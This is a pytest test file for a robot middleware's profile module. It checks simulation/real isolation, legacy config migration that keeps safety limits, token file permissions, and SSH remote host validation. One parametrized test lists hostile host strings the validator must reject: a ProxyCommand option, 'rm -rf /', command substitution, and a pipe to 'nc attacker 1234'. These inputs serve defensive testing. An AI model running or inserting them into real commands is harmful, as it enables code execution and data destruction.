"""Profiles: isolation, provenance/migration, host validation, no secret storage."""
import json
import stat
import sys
from pathlib import Path

import pytest

from piperx_middleware import profiles
from piperx_middleware.models import DomainError, Settings


def mode_of(path: Path) -> int:
    return stat.S_IMODE(path.stat().st_mode)


def write_json(path: Path, data):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data), encoding="utf-8")


def read_config(profile) -> dict:
    return json.loads(profile.config_path.read_text(encoding="utf-8"))


def write_config(profile, config: dict) -> None:
    write_json(profile.config_path, config)


def raw(path: Path) -> bytes:
    return path.read_bytes()


def backup_path(profile, name: str) -> Path:
    return profile.root / profiles.BACKUP_DIR_NAME / f"{name}{profiles.BACKUP_SUFFIX}"


# Every execution/feedback restriction in Settings, with a non-default value.
RESTRICTION_VALUES = {
    "connect_timeout_s": 12.5,
    "max_speed_percent": 17,
    "max_move_deg": 2.5,
    "max_velocity_deg_s": 4.5,
    "reference_deg_s": 0.25,
    "feedback_timeout_s": 0.05,
    "plan_ttl_s": 30,
    "gripper_max_m": 0.05,
    "gripper_effort_limit": 0.5,
}
TCP_OFFSET_VALUES = {
    "tcp_offset_m": [0.01, -0.02, 0.03],
    "tcp_offset_rpy_deg": [1.0, -2.0, 3.5],
}
NON_DEFAULT_RESTRICTIONS = {**RESTRICTION_VALUES, **TCP_OFFSET_VALUES}
# Physical transport / SDK lookup paths: only a physical legacy source may give
# these to a real profile.
PHYSICAL_VALUES = {
    "can_interface": "socketcan",
    "can_channel": "can3",
    "cando_device_index": 7,
    "sdk_root": "/opt/piper-sdk",
    "cando_source": "/opt/cando-source",
}
POLICY = {
    "mode": "always",
    "limits": {"max_speed_percent": 25, "gripper_max_m": 0.05},
    "automatic": {"max_joint_step_deg": 1.5},
    "version": 3,
}


def test_profile_root_is_isolated_per_mode_and_target(tmp_path):
    sim_local = profiles.profile_root(tmp_path, "simulation", "local")
    real_local = profiles.profile_root(tmp_path, "real", "local")
    sim_remote = profiles.profile_root(tmp_path, "simulation", "lab")
    real_remote = profiles.profile_root(tmp_path, "real", "lab")
    assert len({sim_local, real_local, sim_remote, real_remote}) == 4
    assert sim_local == tmp_path / "profiles" / "simulation" / "local"
    assert profiles.profile_id("simulation", "local") != profiles.profile_id("real", "local")
    assert profiles.profile_id("simulation", "lab") != profiles.profile_id("simulation", "local")


@pytest.mark.parametrize("mode", ["sim", "SIMULATION", "physical", "", None, 5])
def test_profile_root_rejects_unknown_mode(tmp_path, mode):
    with pytest.raises((DomainError, ValueError)):
        profiles.profile_root(tmp_path, mode)


@pytest.mark.parametrize("target", ["../escape", "a/b", "..", "", " ", "a\\b", "-x", "a" * 65, None])
def test_profile_root_rejects_unsafe_target(tmp_path, target):
    with pytest.raises((DomainError, ValueError)):
        profiles.profile_root(tmp_path, "simulation", target)


def test_ensure_profile_creates_private_config_tokens_and_provenance(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    assert profile.backend == "mujoco"
    assert profile.readonly is False
    config = json.loads(profile.config_path.read_text())
    assert config["backend"] == "mujoco"
    assert config["managed_control"] is True
    assert config["managed_profile_id"] == profile.profile_id
    assert config["host"] == "127.0.0.1"
    assert config["port"] == 0
    assert Path(config["data_dir"]) == profile.root
    assert mode_of(profile.root) == 0o700
    assert mode_of(profile.model_token_file) == 0o600
    assert mode_of(profile.operator_token_file) == 0o600
    model = profile.model_token_file.read_text().strip()
    operator = profile.operator_token_file.read_text().strip()
    assert len(model) >= 32 and len(operator) >= 32 and model != operator
    provenance = json.loads(profile.provenance_path.read_text())
    assert provenance["mode"] == "simulation"
    assert provenance["target"] == "local"
    assert provenance["profile_id"] == profile.profile_id
    assert provenance["managed_control"] is True
    # Repeated provisioning is stable and never rotates credentials.
    again = profiles.ensure_profile(tmp_path, "simulation")
    assert again.model_token_file.read_text() == profile.model_token_file.read_text()


def test_real_profile_uses_physical_backend_and_never_simulator(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "real")
    assert profile.backend == "agx"
    config = json.loads(profile.config_path.read_text())
    assert config["backend"] == "agx"
    assert config["managed_control"] is True
    # Tampering a real profile into a simulator is refused.
    config["backend"] = "mujoco"
    write_json(profile.config_path, config)
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "real")
    assert exc.value.code == "mode_restriction"


def test_simulation_profile_refuses_physical_backend(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = json.loads(profile.config_path.read_text())
    config["backend"] = "agx"
    write_json(profile.config_path, config)
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "mode_restriction"


def test_migration_preserves_readonly_restriction_and_latch(tmp_path):
    write_json(tmp_path / "config.json", {
        "backend": "mujoco", "allow_motion": False, "simulation_seed": 7,
        "port": 8765, "control_profile": "calibration",
    })
    (tmp_path / "estop.latched").write_text("collision_feedback", encoding="utf-8")

    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = json.loads(profile.config_path.read_text())
    assert config["allow_motion"] is False, "a legacy read-only restriction must never be relaxed"
    assert config["simulation_seed"] == 7
    assert profile.readonly is True
    assert profile.latch is True
    assert (profile.root / profiles.LATCH_NAME).read_text() == "collision_feedback"
    provenance = json.loads(profile.provenance_path.read_text())
    assert provenance["readonly"] is True
    assert provenance["latch"] is True
    assert provenance["migrated"] is True
    assert provenance["legacy_source"] == str(tmp_path / "config.json")

    # A read-only profile stays read-only on later starts.
    again = profiles.ensure_profile(tmp_path, "simulation")
    assert again.readonly is True
    assert json.loads(again.config_path.read_text())["allow_motion"] is False


def test_migration_does_not_carry_simulator_config_into_real_profile(tmp_path):
    write_json(tmp_path / "config.json", {"backend": "mujoco", "allow_motion": True, "simulation_seed": 3})
    profile = profiles.ensure_profile(tmp_path, "real")
    config = json.loads(profile.config_path.read_text())
    assert config["backend"] == "agx"
    assert config["allow_motion"] is True
    assert "simulation_seed" not in config


def test_real_profile_migration_copies_physical_settings_only(tmp_path):
    write_json(tmp_path / "config.json", {
        "backend": "agx", "allow_motion": False, "can_interface": "socketcan",
        "can_channel": "can1", "control_profile": "calibration",
    })
    profile = profiles.ensure_profile(tmp_path, "real")
    config = json.loads(profile.config_path.read_text())
    assert config["can_interface"] == "socketcan"
    assert config["can_channel"] == "can1"
    assert config["control_profile"] == "calibration"
    assert config["allow_motion"] is False


# --------------------------------------------------------------------------
# migration preserves every configured restriction
# --------------------------------------------------------------------------

def test_new_profile_writes_explicit_conservative_limits(tmp_path):
    """A genuinely new profile spells out the conservative Settings defaults."""
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    for field in NON_DEFAULT_RESTRICTIONS:
        assert config[field] == getattr(Settings(), field), f"new profile must state {field} explicitly"


@pytest.mark.parametrize("field,value", sorted(NON_DEFAULT_RESTRICTIONS.items()))
def test_migration_preserves_every_execution_and_feedback_restriction(tmp_path, field, value):
    assert value != getattr(Settings(), field), "test value must differ from the Settings default"
    write_json(tmp_path / "config.json", {"backend": "mujoco", "allow_motion": False, field: value})
    original = raw(tmp_path / "config.json")

    profile = profiles.ensure_profile(tmp_path, "simulation")

    assert read_config(profile)[field] == value, f"{field} was silently reset to its default"
    assert profile.readonly is True
    assert raw(tmp_path / "config.json") == original


def test_migration_preserves_full_restriction_table_and_control_profile(tmp_path):
    legacy = {
        "backend": "agx", "allow_motion": False, "control_profile": "calibration",
        **NON_DEFAULT_RESTRICTIONS, **PHYSICAL_VALUES,
    }
    write_json(tmp_path / "config.json", legacy)
    original = raw(tmp_path / "config.json")

    config = read_config(profiles.ensure_profile(tmp_path, "real"))

    for field, value in NON_DEFAULT_RESTRICTIONS.items():
        assert config[field] == value, f"{field} was not preserved"
    for field, value in PHYSICAL_VALUES.items():
        assert config[field] == value, f"{field} was not preserved"
    assert config["control_profile"] == "calibration"
    assert config["allow_motion"] is False
    assert raw(tmp_path / "config.json") == original


@pytest.mark.parametrize("field,value", sorted(PHYSICAL_VALUES.items()))
def test_real_migration_preserves_physical_source_paths(tmp_path, field, value):
    write_json(tmp_path / "config.json", {"backend": "agx", "allow_motion": True, field: value})
    profile = profiles.ensure_profile(tmp_path, "real")
    assert read_config(profile)[field] == value


def test_simulation_migration_preserves_sim_seed_and_asset(tmp_path):
    write_json(tmp_path / "config.json", {"backend": "mujoco", "allow_motion": True,
                                          "simulation_seed": 4242, "simulation_asset": "/opt/scene.xml"})
    config = read_config(profiles.ensure_profile(tmp_path, "simulation"))
    assert config["simulation_seed"] == 4242
    assert config["simulation_asset"] == "/opt/scene.xml"


def test_real_migration_from_simulation_source_keeps_restrictions_but_no_physical_paths(tmp_path):
    other_interface = "agx_cando" if sys.platform.startswith("linux") else "socketcan"
    legacy = {
        "backend": "mujoco", "allow_motion": False, "simulation_seed": 3, "simulation_asset": "/opt/scene.xml",
        "can_interface": other_interface, "can_channel": "can9", "cando_device_index": 9,
        "sdk_root": "/opt/sim-sdk", "cando_source": "/opt/sim-cando",
        "max_speed_percent": 25, "max_move_deg": 1.5, "control_profile": "calibration",
    }
    write_json(tmp_path / "config.json", legacy)

    config = read_config(profiles.ensure_profile(tmp_path, "real"))

    # Restrictions and the control profile are conservative and survive any source.
    assert config["max_speed_percent"] == 25
    assert config["max_move_deg"] == 1.5
    assert config["control_profile"] == "calibration"
    assert config["allow_motion"] is False
    # Simulator settings and physical paths must not configure the real robot.
    for field in ("simulation_seed", "simulation_asset"):
        assert field not in config, f"{field} leaked from a simulation source into a real profile"
    assert config["can_interface"] != other_interface
    assert config["can_channel"] != "can9"
    assert config.get("cando_device_index") is None
    assert config.get("sdk_root") is None
    assert config.get("cando_source") is None


def test_legacy_listener_and_storage_fields_are_rebuilt_not_copied(tmp_path):
    write_json(tmp_path / "config.json", {
        "backend": "mujoco", "allow_motion": True, "host": "0.0.0.0", "port": 9,
        "data_dir": "/tmp/elsewhere", "managed_control": False, "managed_profile_id": "foreign",
    })
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    assert config["host"] == "127.0.0.1"
    assert config["port"] == 0
    assert Path(config["data_dir"]) == profile.root
    assert config["managed_control"] is True
    assert config["managed_profile_id"] == profile.profile_id


def test_one_legacy_source_migrates_into_independent_readonly_latched_profiles(tmp_path):
    write_json(tmp_path / "config.json", {
        "backend": "agx", "allow_motion": False, "control_profile": "calibration",
        "max_speed_percent": 33, "can_channel": "can7",
    })
    (tmp_path / "estop.latched").write_text("collision_feedback", encoding="utf-8")
    original = raw(tmp_path / "config.json")

    simulation = profiles.ensure_profile(tmp_path, "simulation")
    real = profiles.ensure_profile(tmp_path, "real")

    assert simulation.root != real.root
    assert simulation.profile_id != real.profile_id
    for profile in (simulation, real):
        config = read_config(profile)
        assert profile.readonly is True and profile.latch is True
        assert config["allow_motion"] is False
        assert config["max_speed_percent"] == 33
        assert config["control_profile"] == "calibration"
        assert (profile.root / profiles.LATCH_NAME).read_text() == "collision_feedback"
    assert read_config(real)["can_channel"] == "can7"
    assert "can_channel" not in read_config(simulation)
    assert raw(tmp_path / "config.json") == original


# --------------------------------------------------------------------------
# backups of existing files
# --------------------------------------------------------------------------

def test_migration_backs_up_legacy_config_and_leaves_originals_unchanged(tmp_path):
    legacy = {"backend": "mujoco", "allow_motion": False, "simulation_seed": 9, "max_speed_percent": 21}
    write_json(tmp_path / "config.json", legacy)
    original = raw(tmp_path / "config.json")
    (tmp_path / "estop.latched").write_bytes(b"collision_feedback")

    profile = profiles.ensure_profile(tmp_path, "simulation")

    backup = backup_path(profile, "legacy-config.json")
    assert backup.is_file()
    assert backup.read_bytes() == original
    assert mode_of(backup) == 0o600
    assert mode_of(profile.root / profiles.BACKUP_DIR_NAME) == 0o700
    latch_backup = backup_path(profile, f"legacy-{profiles.LATCH_NAME}")
    assert latch_backup.read_bytes() == b"collision_feedback"
    assert raw(tmp_path / "config.json") == original
    assert (tmp_path / "estop.latched").read_bytes() == b"collision_feedback"


def test_genuinely_new_profile_has_nothing_to_back_up(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    assert not (profile.root / profiles.BACKUP_DIR_NAME).exists()


def test_repair_backs_up_existing_config_before_rewriting(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    config.update({"managed_control": False, "managed_profile_id": "someone-else",
                   "data_dir": str(tmp_path / "elsewhere"), **NON_DEFAULT_RESTRICTIONS})
    write_config(profile, config)
    before = raw(profile.config_path)

    repaired = profiles.ensure_profile(tmp_path, "simulation")

    assert backup_path(repaired, profiles.CONFIG_NAME).read_bytes() == before
    updated = read_config(repaired)
    assert updated["managed_control"] is True
    assert updated["managed_profile_id"] == repaired.profile_id
    assert Path(updated["data_dir"]) == repaired.root
    for field, value in NON_DEFAULT_RESTRICTIONS.items():
        assert updated[field] == value, f"repair must not reset {field}"


# --------------------------------------------------------------------------
# credentials are never carried across profiles
# --------------------------------------------------------------------------

def test_migration_never_copies_credentials_or_token_files(tmp_path):
    (tmp_path / "model.token").write_text("legacy-model-token-value-0123456789", encoding="utf-8")
    (tmp_path / "operator.token").write_text("legacy-operator-token-value-0123456789", encoding="utf-8")
    write_json(tmp_path / "config.json", {
        "backend": "mujoco", "allow_motion": True, "max_speed_percent": 21,
        "model_token": "embedded-model-secret", "operator_token": "embedded-operator-secret",
        "api_key": "sk-embedded-secret", "deepseek_api_key": "sk-deepseek-secret",
    })

    profile = profiles.ensure_profile(tmp_path, "simulation")

    text = profile.config_path.read_text(encoding="utf-8")
    for secret in ("embedded-model-secret", "embedded-operator-secret", "sk-embedded-secret",
                   "sk-deepseek-secret", "legacy-model-token-value-0123456789",
                   "legacy-operator-token-value-0123456789"):
        assert secret not in text
    assert read_config(profile)["max_speed_percent"] == 21
    assert profile.model_token_file.read_text().strip() != "legacy-model-token-value-0123456789"
    assert profile.operator_token_file.read_text().strip() != "legacy-operator-token-value-0123456789"


# --------------------------------------------------------------------------
# bad allow_motion legacy values
# --------------------------------------------------------------------------

@pytest.mark.parametrize("legacy", [
    {"backend": "mujoco", "max_speed_percent": 25},  # missing
    {"backend": "mujoco", "allow_motion": "false"},
    {"backend": "mujoco", "allow_motion": "False"},
    {"backend": "mujoco", "allow_motion": 0},
    {"backend": "mujoco", "allow_motion": 1},
    {"backend": "mujoco", "allow_motion": 0.0},
    {"backend": "mujoco", "allow_motion": None},
    {"backend": "mujoco", "allow_motion": []},
])
def test_legacy_bad_allow_motion_is_refused_before_any_profile_is_written(tmp_path, legacy):
    write_json(tmp_path / "config.json", legacy)
    original = raw(tmp_path / "config.json")

    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")

    assert exc.value.code == "invalid_legacy_config"
    assert not (profiles.profile_root(tmp_path, "simulation") / profiles.CONFIG_NAME).exists()
    assert raw(tmp_path / "config.json") == original


@pytest.mark.parametrize("payload", [[], "not-an-object", 5, True, None])
def test_legacy_config_must_be_an_object(tmp_path, payload):
    (tmp_path / "config.json").write_text(json.dumps(payload), encoding="utf-8")
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "invalid_legacy_config"
    assert not (profiles.profile_root(tmp_path, "simulation") / profiles.CONFIG_NAME).exists()


@pytest.mark.parametrize("mode,field,bad", [
    ("simulation", "max_speed_percent", "25"),
    ("simulation", "max_speed_percent", 25.5),
    ("simulation", "max_speed_percent", True),
    ("simulation", "max_speed_percent", 101),
    ("simulation", "max_move_deg", "3.0"),
    ("simulation", "max_move_deg", 0),
    ("simulation", "max_velocity_deg_s", 0),
    ("simulation", "reference_deg_s", 2),
    ("simulation", "feedback_timeout_s", 0),
    ("simulation", "plan_ttl_s", 0),
    ("simulation", "gripper_max_m", 0.5),
    ("simulation", "gripper_effort_limit", 0),
    ("simulation", "connect_timeout_s", "2.0"),
    ("simulation", "simulation_seed", "7"),
    ("simulation", "simulation_seed", True),
    ("simulation", "tcp_offset_m", [0.0, 0.0]),
    ("simulation", "tcp_offset_m", [0.0, 0.0, "0.0"]),
    ("simulation", "tcp_offset_rpy_deg", "0,0,0"),
    ("simulation", "control_profile", "yolo"),
    ("real", "can_interface", "bogus"),
    ("real", "can_channel", 5),
    ("real", "cando_device_index", 3.0),
    ("real", "sdk_root", 5),
])
def test_legacy_malformed_restriction_is_refused_not_normalized(tmp_path, mode, field, bad):
    write_json(tmp_path / "config.json", {"backend": "agx", "allow_motion": False, field: bad})
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, mode)
    assert exc.value.code == "invalid_legacy_config"
    assert not (profiles.profile_root(tmp_path, mode) / profiles.CONFIG_NAME).exists()


# --------------------------------------------------------------------------
# interaction policy: embedded and standalone legacy file
# --------------------------------------------------------------------------

def test_embedded_interaction_policy_is_preserved(tmp_path):
    write_json(tmp_path / "config.json", {"backend": "mujoco", "allow_motion": False, "interaction_policy": POLICY})
    policy = read_config(profiles.ensure_profile(tmp_path, "simulation"))["interaction_policy"]
    assert policy["mode"] == "always"
    assert policy["version"] == 3
    assert policy["limits"]["max_speed_percent"] == 25
    assert policy["limits"]["gripper_max_m"] == 0.05
    assert policy["automatic"]["max_joint_step_deg"] == 1.5


@pytest.mark.parametrize("bad", [
    {"mode": "yolo"},
    {"limits": {"max_speed_percent": 250}},
    {"limits": {"max_speed_percent": "25"}},
    {"limits": {"gripper_min_m": 0.08, "gripper_max_m": 0.05}},
    {"version": 0},
    {"token": "secret"},
])
def test_invalid_embedded_interaction_policy_is_refused(tmp_path, bad):
    write_json(tmp_path / "config.json", {"backend": "mujoco", "allow_motion": True, "interaction_policy": bad})
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "invalid_legacy_config"
    assert not (profiles.profile_root(tmp_path, "simulation") / profiles.CONFIG_NAME).exists()


def test_separate_legacy_policy_file_is_backed_up_and_copied(tmp_path):
    policy_bytes = (json.dumps(POLICY, indent=2) + "\n").encode("utf-8")
    (tmp_path / profiles.INTERACTION_POLICY_NAME).write_bytes(policy_bytes)

    profile = profiles.ensure_profile(tmp_path, "simulation")

    policy = read_config(profile)["interaction_policy"]
    assert policy["mode"] == "always" and policy["limits"]["max_speed_percent"] == 25
    local = profile.root / profiles.INTERACTION_POLICY_NAME
    assert json.loads(local.read_text(encoding="utf-8")) == policy
    assert backup_path(profile, f"legacy-{profiles.INTERACTION_POLICY_NAME}").read_bytes() == policy_bytes
    assert (tmp_path / profiles.INTERACTION_POLICY_NAME).read_bytes() == policy_bytes
    provenance = json.loads(profile.provenance_path.read_text(encoding="utf-8"))
    assert provenance["migrated"] is True
    assert provenance["legacy_policy_source"] == str(tmp_path / profiles.INTERACTION_POLICY_NAME)


def test_policy_file_without_legacy_config_becomes_the_profile_policy(tmp_path):
    (tmp_path / profiles.INTERACTION_POLICY_NAME).write_text(json.dumps(POLICY), encoding="utf-8")
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    assert config["interaction_policy"]["mode"] == "always"
    assert (profile.root / profiles.INTERACTION_POLICY_NAME).is_file()
    assert config["allow_motion"] is True  # no legacy restriction existed


def test_conflicting_embedded_and_file_policies_are_refused(tmp_path):
    write_json(tmp_path / "config.json", {"backend": "mujoco", "allow_motion": True, "interaction_policy": POLICY})
    write_json(tmp_path / profiles.INTERACTION_POLICY_NAME, {**POLICY, "mode": "risk"})
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "invalid_legacy_config"
    assert not (profiles.profile_root(tmp_path, "simulation") / profiles.CONFIG_NAME).exists()


def test_matching_embedded_and_file_policies_migrate(tmp_path):
    write_json(tmp_path / "config.json", {"backend": "mujoco", "allow_motion": True, "interaction_policy": POLICY})
    write_json(tmp_path / profiles.INTERACTION_POLICY_NAME, POLICY)
    assert read_config(profiles.ensure_profile(tmp_path, "simulation"))["interaction_policy"]["version"] == 3


@pytest.mark.parametrize("bad", [{"mode": "yolo"}, {"limits": {"max_speed_percent": 250}}, {"token": "x"},
                                 [], "policy"])
def test_invalid_legacy_policy_file_is_refused(tmp_path, bad):
    (tmp_path / profiles.INTERACTION_POLICY_NAME).write_text(json.dumps(bad), encoding="utf-8")
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "invalid_legacy_config"


def test_existing_profile_embedded_policy_is_preserved_and_validated(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    config["interaction_policy"] = POLICY
    write_config(profile, config)

    again = profiles.ensure_profile(tmp_path, "simulation")
    assert read_config(again)["interaction_policy"]["mode"] == "always"

    bad = read_config(again)
    bad["interaction_policy"] = {"mode": "yolo"}
    write_config(again, bad)
    before = raw(again.config_path)
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "invalid_profile_config"
    assert raw(again.config_path) == before


def test_unreadable_legacy_config_is_refused_not_ignored(tmp_path):
    (tmp_path / "config.json").write_text("{not json", encoding="utf-8")
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "invalid_legacy_config"


def test_unreadable_legacy_latch_is_refused(tmp_path):
    write_json(tmp_path / "config.json", {"backend": "mujoco", "allow_motion": True})
    latch = tmp_path / "estop.latched"
    latch.mkdir()  # a directory cannot be read as a latch file
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "latch_unreadable"


def test_provenance_identity_mismatch_refused(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    write_json(profile.provenance_path, {"mode": "real", "target": "local",
                                         "profile_id": profiles.profile_id("real", "local")})
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "profile_identity_mismatch"


def test_repair_enforces_managed_invariants(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = json.loads(profile.config_path.read_text())
    config.update({"managed_control": False, "managed_profile_id": "other", "data_dir": "/tmp/elsewhere"})
    write_json(profile.config_path, config)
    repaired = profiles.ensure_profile(tmp_path, "simulation")
    updated = json.loads(repaired.config_path.read_text())
    assert updated["managed_control"] is True
    assert updated["managed_profile_id"] == repaired.profile_id
    assert Path(updated["data_dir"]) == repaired.root
    # Non-loopback listeners are refused rather than rewritten.
    updated["host"] = "0.0.0.0"
    write_json(repaired.config_path, updated)
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "invalid_profile_config"


# --------------------------------------------------------------------------
# an existing profile: malformed values are refused, never repaired permissively
# --------------------------------------------------------------------------

@pytest.mark.parametrize("bad", ["false", "False", 0, 1, 0.0, None, [], {}])
def test_existing_profile_bad_allow_motion_is_refused_not_overwritten(tmp_path, bad):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    config["allow_motion"] = bad
    write_config(profile, config)
    before = raw(profile.config_path)

    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")

    assert exc.value.code == "invalid_profile_config"
    assert raw(profile.config_path) == before
    assert not (profile.root / profiles.BACKUP_DIR_NAME).exists()


def test_existing_profile_missing_allow_motion_is_refused_not_defaulted(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    del config["allow_motion"]
    write_config(profile, config)
    before = raw(profile.config_path)

    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")

    assert exc.value.code == "invalid_profile_config"
    assert raw(profile.config_path) == before
    assert not (profile.root / profiles.BACKUP_DIR_NAME).exists()


def test_existing_profile_readonly_stays_readonly_across_repairs(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    config["allow_motion"] = False
    config["managed_control"] = False  # force a managed repair/rewrite
    write_config(profile, config)

    repaired = profiles.ensure_profile(tmp_path, "simulation")

    assert read_config(repaired)["allow_motion"] is False
    assert repaired.readonly is True


@pytest.mark.parametrize("field,bad", [
    ("max_speed_percent", "25"),
    ("max_speed_percent", 25.5),
    ("max_speed_percent", True),
    ("max_speed_percent", 101),
    ("max_speed_percent", -1),
    ("max_move_deg", "3.0"),
    ("max_move_deg", 0),
    ("max_move_deg", 90),
    ("max_velocity_deg_s", 0),
    ("max_velocity_deg_s", 20),
    ("reference_deg_s", 2),
    ("feedback_timeout_s", 0),
    ("feedback_timeout_s", 0.5),
    ("plan_ttl_s", 0),
    ("plan_ttl_s", 1000),
    ("gripper_max_m", 0.5),
    ("gripper_effort_limit", 0),
    ("gripper_effort_limit", 5),
    ("connect_timeout_s", "2.0"),
    ("connect_timeout_s", 0),
    ("connect_timeout_s", 60),
    ("simulation_seed", "7"),
    ("simulation_seed", True),
    ("tcp_offset_m", [0.0, 0.0]),
    ("tcp_offset_m", [0.0, 0.0, "0.0"]),
    ("tcp_offset_rpy_deg", "0,0,0"),
    ("control_profile", "yolo"),
    ("can_interface", "bogus"),
    ("firmware_profile", "v1"),
    ("cando_device_index", 3.0),
    ("cando_device_index", 500),
    ("sdk_root", 5),
    ("simulation_asset", 5),
])
def test_existing_profile_malformed_restriction_is_refused_not_normalized(tmp_path, field, bad):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    config[field] = bad
    write_config(profile, config)
    before = raw(profile.config_path)

    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")

    assert exc.value.code == "invalid_profile_config"
    assert raw(profile.config_path) == before


def test_existing_profile_unknown_field_is_refused(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    config["max_move_degrees"] = 1
    write_config(profile, config)
    before = raw(profile.config_path)

    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")

    assert exc.value.code == "invalid_profile_config"
    assert raw(profile.config_path) == before


@pytest.mark.parametrize("bad", ["false", 0, 1, None])
def test_load_profile_refuses_malformed_allow_motion(tmp_path, bad):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    config["allow_motion"] = bad
    write_config(profile, config)
    with pytest.raises(DomainError) as exc:
        profiles.load_profile(tmp_path, "simulation")
    assert exc.value.code == "invalid_profile_config"


def test_load_profile_refuses_missing_allow_motion(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    config = read_config(profile)
    del config["allow_motion"]
    write_config(profile, config)
    with pytest.raises(DomainError) as exc:
        profiles.load_profile(tmp_path, "simulation")
    assert exc.value.code == "invalid_profile_config"


def test_load_profile_requires_existing_profile(tmp_path):
    with pytest.raises(DomainError) as exc:
        profiles.load_profile(tmp_path, "simulation")
    assert exc.value.code == "profile_missing"
    created = profiles.ensure_profile(tmp_path, "simulation")
    loaded = profiles.load_profile(tmp_path, "simulation")
    assert loaded.root == created.root
    assert loaded.profile_id == created.profile_id


def test_credentials_are_never_rotated_implicitly(tmp_path):
    profile = profiles.ensure_profile(tmp_path, "simulation")
    profile.model_token_file.write_text("short\n", encoding="utf-8")
    with pytest.raises(DomainError) as exc:
        profiles.ensure_profile(tmp_path, "simulation")
    assert exc.value.code == "invalid_credentials"


def test_save_and_list_remotes_roundtrip(tmp_path):
    saved = profiles.save_remote(tmp_path, "lab", "piper-lab.local")
    assert saved == {"name": "lab", "ssh_host": "piper-lab.local"}
    profiles.save_remote(tmp_path, "bench", "user@10.0.0.5")
    assert profiles.list_remotes(tmp_path) == [
        {"name": "lab", "ssh_host": "piper-lab.local"},
        {"name": "bench", "ssh_host": "user@10.0.0.5"},
    ]
    store = tmp_path / profiles.REMOTES_NAME
    assert mode_of(store) == 0o600
    stored = store.read_text()
    assert "password" not in stored.lower()
    # Update in place, keeping order.
    profiles.save_remote(tmp_path, "lab", "piper-lab2.local")
    assert profiles.list_remotes(tmp_path)[0] == {"name": "lab", "ssh_host": "piper-lab2.local"}
    assert profiles.get_remote(tmp_path, "missing") is None


@pytest.mark.parametrize("host", [
    "-oProxyCommand=touch /tmp/pwned",
    "--config=evil",
    "host; rm -rf /",
    "host && reboot",
    "host`id`",
    "host$(id)",
    "host|nc attacker 1234",
    "host name",
    "host\nProxyCommand evil",
    "host\x00",
    "",
    " ",
    "a" * 256,
    "user:secret@host",
    "@host",
    "host@",
    "host'quote",
    'host"quote',
    "%h",
])
def test_save_remote_rejects_injection_and_passwords(tmp_path, host):
    with pytest.raises((DomainError, ValueError)):
        profiles.save_remote(tmp_path, "lab", host)
    assert not (tmp_path / profiles.REMOTES_NAME).exists()


@pytest.mark.parametrize("name", ["local", "LOCAL", "", " ", "../x", "a/b", "-x", "a" * 65, None, 7])
def test_save_remote_rejects_bad_names(tmp_path, name):
    with pytest.raises((DomainError, ValueError)):
        profiles.save_remote(tmp_path, name, "piper-lab.local")


def test_save_remote_rejects_case_insensitive_duplicate(tmp_path):
    profiles.save_remote(tmp_path, "Lab", "one.local")
    with pytest.raises(DomainError) as exc:
        profiles.save_remote(tmp_path, "lab", "two.local")
    assert exc.value.code == "remote_conflict"


def test_corrupt_remote_store_fails_closed(tmp_path):
    (tmp_path / profiles.REMOTES_NAME).write_text("{not json", encoding="utf-8")
    with pytest.raises(DomainError) as exc:
        profiles.list_remotes(tmp_path)
    assert exc.value.code == "invalid_remote_store"
    # A hand-edited credential is re-validated on read and refused.
    write_json(tmp_path / profiles.REMOTES_NAME,
               {"version": 1, "remotes": [{"name": "lab", "ssh_host": "user:pw@host"}]})
    with pytest.raises(DomainError) as exc:
        profiles.list_remotes(tmp_path)
    assert exc.value.code == "password_not_allowed"


def test_remove_remote(tmp_path):
    profiles.save_remote(tmp_path, "lab", "piper-lab.local")
    assert profiles.remove_remote(tmp_path, "lab") is True
